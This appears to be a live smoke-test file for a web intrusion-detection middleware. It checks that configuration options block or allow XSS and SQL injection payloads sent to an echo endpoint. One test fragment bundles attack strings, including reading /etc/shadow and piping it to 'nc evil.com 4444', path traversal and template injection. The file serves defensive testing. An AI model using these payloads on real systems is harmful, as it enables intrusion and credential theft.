import json

import httpx

from tests.live_smoke.driver import ScenarioContext, wait_until
from tests.live_smoke.registry import scenario

_BASE = {
    "auto_ban_threshold": 1000,
    "rate_limit": 1000,
    "excluded_detection_headers": ["x-real-ip", "x-forwarded-for"],
}

_XSS = "<script>alert(1)</script>"
_SQLI = "' UNION SELECT password FROM admin--"


def _echo(client: httpx.Client, body: dict[str, object]) -> httpx.Response:
    return client.post("/basic/echo", json=body)


@scenario(
    covers={"enable_penetration_detection"},
    config={**_BASE, "enable_penetration_detection": False},
)
def enable_penetration_detection_toggle(ctx: ScenarioContext) -> None:
    response = _echo(ctx.client, {"note": _XSS, "query": _SQLI})
    assert response.status_code == 200, (
        "enable_penetration_detection=False still blocked an attack payload: "
        f"{response.status_code}"
    )


@scenario(
    covers={"enabled_detection_categories", "suspicious_activity"},
    config={
        **_BASE,
        "enabled_detection_categories": ["xss"],
        "detection_semantic_threshold": 1.0,
    },
)
def enabled_detection_categories_narrows_scan(ctx: ScenarioContext) -> None:
    sqli_only = _echo(ctx.client, {"note": _SQLI})
    assert sqli_only.status_code == 200, (
        "enabled_detection_categories=['xss'] still blocked a sqli-only payload: "
        f"{sqli_only.status_code}"
    )

    xss = _echo(ctx.client, {"note": _XSS})
    assert xss.status_code == 400, (
        "enabled_detection_categories=['xss'] did not block an xss payload: "
        f"{xss.status_code}"
    )


@scenario(
    covers={"excluded_detection_params", "excluded_detection_body_fields"},
    config={
        **_BASE,
        "excluded_detection_params": ["safe_q"],
        "excluded_detection_body_fields": ["safe_field"],
    },
)
def excluded_detection_params_and_body_fields_skip_scanning(
    ctx: ScenarioContext,
) -> None:
    excluded_param = ctx.client.post(
        "/basic/echo", params={"safe_q": _XSS}, json={"note": "hello"}
    )
    assert excluded_param.status_code == 200, (
        "excluded_detection_params did not let an attack through the named param: "
        f"{excluded_param.status_code}"
    )

    scanned_param = ctx.client.post(
        "/basic/echo", params={"other_q": _XSS}, json={"note": "hello"}
    )
    assert scanned_param.status_code == 400, (
        f"a non-excluded query param stopped being scanned: {scanned_param.status_code}"
    )

    excluded_field = _echo(ctx.client, {"safe_field": _XSS})
    assert excluded_field.status_code == 200, (
        "excluded_detection_body_fields did not let an attack through the named "
        f"field: {excluded_field.status_code}"
    )

    scanned_field = _echo(ctx.client, {"other_field": _XSS})
    assert scanned_field.status_code == 400, (
        f"a non-excluded body field stopped being scanned: {scanned_field.status_code}"
    )


@scenario(
    covers={"detection_scan_body"}, config={**_BASE, "detection_scan_body": False}
)
def detection_scan_body_disabled_skips_body_only(ctx: ScenarioContext) -> None:
    body_attack = _echo(ctx.client, {"note": _XSS})
    assert body_attack.status_code == 200, (
        "detection_scan_body=False still blocked a body-only attack: "
        f"{body_attack.status_code}"
    )

    param_attack = ctx.client.post(
        "/basic/echo", params={"q": _XSS}, json={"note": "hello"}
    )
    assert param_attack.status_code == 400, (
        "detection_scan_body=False also stopped scanning query params: "
        f"{param_attack.status_code}"
    )


def _lines_mentioning(ctx: ScenarioContext, mark: str, needle: str) -> list[str]:
    return [line for line in ctx.stack.logs.lines_since(mark) if needle in line]


@scenario(
    covers={"detection_max_scan_values"},
    config={**_BASE, "detection_max_scan_values": 2},
)
def detection_max_scan_values_caps_remaining_fields(ctx: ScenarioContext) -> None:
    mark = ctx.stack.logs.mark()

    response = _echo(ctx.client, {"field1": "hello", "field2": _XSS})
    assert response.status_code == 200, (
        "detection_max_scan_values=2 still caught an attack past the value budget: "
        f"{response.status_code}"
    )

    assert _lines_mentioning(ctx, mark, "detection_max_scan_values (2) reached"), (
        "no detection_max_scan_values warning was logged"
    )


@scenario(
    covers={"detection_max_scan_chars"},
    config={**_BASE, "detection_max_scan_chars": 1024},
)
def detection_max_scan_chars_caps_remaining_values(ctx: ScenarioContext) -> None:
    mark = ctx.stack.logs.mark()
    filler = (
        "the quick brown fox jumps over the lazy dog and runs away fast today " * 20
    )[:1100]

    response = _echo(ctx.client, {"filler": filler, "attack": _XSS})
    assert response.status_code == 200, (
        "detection_max_scan_chars=1024 still caught an attack past the char budget: "
        f"{response.status_code}"
    )

    assert _lines_mentioning(ctx, mark, "detection_max_scan_chars (1024) reached"), (
        "no detection_max_scan_chars warning was logged"
    )


@scenario(
    covers={"detection_max_json_depth"},
    config={**_BASE, "detection_max_json_depth": 1},
)
def detection_max_json_depth_scans_capped_subtree_as_text(
    ctx: ScenarioContext,
) -> None:
    mark = ctx.stack.logs.mark()

    response = _echo(ctx.client, {"outer": {"inner": _XSS}})
    assert response.status_code == 400, (
        "detection_max_json_depth=1 let an attack below the cap escape detection "
        f"entirely instead of falling back to text scanning: {response.status_code}"
    )

    assert _lines_mentioning(ctx, mark, "detection_max_json_depth (1) reached"), (
        "no detection_max_json_depth warning was logged"
    )


_STRADDLE_FILLER = (
    "the quick brown fox jumps over the lazy dog and runs away fast today "
    "while birds sing softly near the old wooden bridge "
)


@scenario(
    covers={"detection_max_body_inspect_bytes"},
    config={**_BASE, "detection_max_body_inspect_bytes": 1024},
)
def detection_max_body_inspect_bytes_limits_body_read(ctx: ScenarioContext) -> None:
    mark = ctx.stack.logs.mark()
    near_boundary = (_STRADDLE_FILLER * 20)[:1050] + _XSS
    near = _echo(ctx.client, {"note": near_boundary})
    assert near.status_code == 400, (
        "an attack just past detection_max_body_inspect_bytes, within the "
        f"straddle-overlap window, was missed: {near.status_code}"
    )

    far_boundary = (_STRADDLE_FILLER * 60)[:2000] + _XSS
    far = _echo(ctx.client, {"note": far_boundary})
    assert far.status_code == 200, (
        "an attack well past detection_max_body_inspect_bytes plus the "
        f"straddle-overlap window was still detected: {far.status_code}"
    )

    assert _lines_mentioning(
        ctx, mark, "detection_max_body_inspect_bytes (1024) reached"
    ), "no detection_max_body_inspect_bytes warning was logged"


_SEMANTIC_FILLER = (
    "the quick brown fox jumps over the lazy dog and runs away fast today "
    "while birds sing softly in the morning breeze near the old wooden bridge "
)
_SEMANTIC_SALAD = (
    "eval exec system shell bash cmd sudo wget curl script javascript onerror "
    "onload alert document object select union insert update delete drop from "
    "where render template jinja mustache handlebars "
)


@scenario(
    covers={"detection_max_content_length"},
    config={
        **_BASE,
        "detection_max_content_length": 1000,
        "detection_semantic_threshold": 0.3,
    },
)
def detection_max_content_length_bounds_semantic_window(ctx: ScenarioContext) -> None:
    filler = (_SEMANTIC_FILLER * 20)[:1000]

    filler_alone = _echo(ctx.client, {"note": filler})
    assert filler_alone.status_code == 200, (
        f"plain filler text was flagged as a threat: {filler_alone.status_code}"
    )

    salad_within_window = _echo(ctx.client, {"note": _SEMANTIC_SALAD})
    assert salad_within_window.status_code == 400, (
        "a keyword-dense payload within the semantic window was not flagged: "
        f"{salad_within_window.status_code}"
    )

    salad_past_window = _echo(ctx.client, {"note": filler + _SEMANTIC_SALAD})
    assert salad_past_window.status_code == 200, (
        "detection_max_content_length did not bound the semantic analyzer's "
        f"input window: {salad_past_window.status_code}"
    )


@scenario(
    covers={"detection_semantic_threshold"},
    config={**_BASE, "detection_semantic_threshold": 1.0},
)
def detection_semantic_threshold_raised_suppresses_borderline_hit(
    ctx: ScenarioContext,
) -> None:
    response = _echo(ctx.client, {"note": _SEMANTIC_SALAD})
    assert response.status_code == 200, (
        "detection_semantic_threshold=1.0 still flagged a borderline semantic "
        f"payload: {response.status_code}"
    )


@scenario(
    covers={"detection_threat_score_threshold"},
    config={
        **_BASE,
        "detection_threat_score_threshold": 10.0,
        "detection_semantic_threshold": 1.0,
    },
)
def detection_threat_score_threshold_raised_suppresses_single_match(
    ctx: ScenarioContext,
) -> None:
    response = _echo(ctx.client, {"note": _XSS})
    assert response.status_code == 200, (
        "detection_threat_score_threshold=10.0 still blocked a single "
        f"weight-1.0 regex match: {response.status_code}"
    )


def _query_attack_past_cap() -> str:
    filler = (
        "the quick brown fox jumps over the lazy dog and runs away fast today "
        "while birds sing softly " * 20
    )[:2000]
    return filler + _XSS


@scenario(
    covers=set(),
    config={
        **_BASE,
        "detection_max_body_inspect_bytes": 1024,
        "detection_preserve_attack_patterns": False,
    },
)
def detection_preserve_attack_patterns_false_drops_boundary_attack(
    ctx: ScenarioContext,
) -> None:
    response = ctx.client.get("/basic/ip", params={"q": _query_attack_past_cap()})
    assert response.status_code == 200, (
        "detection_preserve_attack_patterns=False still recovered an attack "
        f"beyond the simple-truncation boundary: {response.status_code}"
    )


@scenario(
    covers={"detection_preserve_attack_patterns"},
    config={
        **_BASE,
        "detection_max_body_inspect_bytes": 1024,
        "detection_preserve_attack_patterns": True,
    },
)
def detection_preserve_attack_patterns_true_recovers_boundary_attack(
    ctx: ScenarioContext,
) -> None:
    response = ctx.client.get("/basic/ip", params={"q": _query_attack_past_cap()})
    assert response.status_code == 400, (
        "detection_preserve_attack_patterns=True did not preserve an attack "
        f"region beyond the truncation boundary: {response.status_code}"
    )


_ANOMALY_CONFIG = {
    **_BASE,
    "enable_agent": True,
    "agent_api_key": "smoke-agent-key",
    "agent_endpoint": "http://agent-stub:8090",
    "agent_flush_interval": 1,
    "detection_slow_pattern_threshold": 0.01,
    "detection_anomaly_threshold": 1.0,
    "detection_min_samples_for_anomaly": 10,
    "detection_monitor_history_size": 100,
    "detection_max_tracked_patterns": 100,
    "detection_anomaly_emission_cooldown": 1.0,
}

_ANOMALY_FRAGMENT = (
    "' OR '1'='1'; SELECT * FROM users WHERE id=1 UNION SELECT password FROM "
    "admin-- <script>alert(document.cookie)</script> ../../etc/passwd; "
    "cat /etc/shadow | nc evil.com 4444 $(whoami) `id` {{7*7}} onerror=alert(1) "
    "javascript:eval(atob('x')) "
)


def _anomaly_payload() -> str:
    filler = (_STRADDLE_FILLER * 200)[:9000]
    return filler + _ANOMALY_FRAGMENT * 5 + filler


def _agent_events(ctx: ScenarioContext) -> list[dict[str, object]]:
    response = ctx.agent.get("/_debug/state")
    if response.status_code != 200:
        return []
    data: dict[str, object] = response.json()
    events = data.get("events", [])
    return events if isinstance(events, list) else []


def _anomaly_event_types_seen(ctx: ScenarioContext) -> set[str] | None:
    types = {
        str(event.get("event_type"))
        for event in _agent_events(ctx)
        if str(event.get("event_type", "")).startswith("pattern_anomaly_")
    }
    needed = {"pattern_anomaly_slow_execution", "pattern_anomaly_statistical_anomaly"}
    return types if needed & types else None


@scenario(
    covers={
        "detection_slow_pattern_threshold",
        "detection_anomaly_threshold",
        "detection_min_samples_for_anomaly",
        "detection_monitor_history_size",
        "detection_max_tracked_patterns",
        "detection_anomaly_emission_cooldown",
    },
    config=_ANOMALY_CONFIG,
)
def detection_performance_monitor_emits_anomaly_telemetry(
    ctx: ScenarioContext,
) -> None:
    ctx.agent.post("/_debug/reset")
    payload = _anomaly_payload()
    for _ in range(20):
        _echo(ctx.client, {"note": payload})

    seen = wait_until(lambda: _anomaly_event_types_seen(ctx), timeout=30.0)
    assert seen, (
        "no pattern_anomaly_* telemetry reached the agent stub within 20s; "
        f"events so far: {json.dumps(_agent_events(ctx))[:2000]}"
    )
    assert "pattern_anomaly_slow_execution" in seen, (
        "detection_slow_pattern_threshold never produced a slow_execution "
        f"anomaly event: {seen}"
    )


@scenario(covers={"suspicious_detection"}, config={**_BASE, "rate_limit": 1301})
def suspicious_detection_decorator_blocks_flagged_route(ctx: ScenarioContext) -> None:
    clean = ctx.client.get("/advanced/suspicious-patterns", params={"query": "hello"})
    assert clean.status_code == 200, (
        f"a clean request to a suspicious_detection route was blocked: "
        f"{clean.status_code}"
    )

    attack = ctx.client.get("/advanced/suspicious-patterns", params={"query": _XSS})
    assert attack.status_code == 400, (
        f"suspicious_detection did not flag an attack payload: {attack.status_code}"
    )
